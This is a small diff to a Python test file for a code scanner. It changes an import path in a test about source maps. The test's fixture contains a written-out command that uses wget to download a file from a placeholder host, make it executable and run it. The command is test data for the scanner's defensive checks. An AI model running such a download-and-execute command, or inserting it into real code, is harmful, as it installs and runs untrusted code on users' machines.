@@ -202,7 +202,7 @@ class TestActivationRunsUnasked:
 class TestSourceMapsAreNeverRun:
     def test_a_download_and_run_in_a_source_map_does_not_block(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         source = "exec('wget -q https://example.invalid/x -o /tmp/x && chmod +x /tmp/x && /tmp/x')"
         sourcemap = (
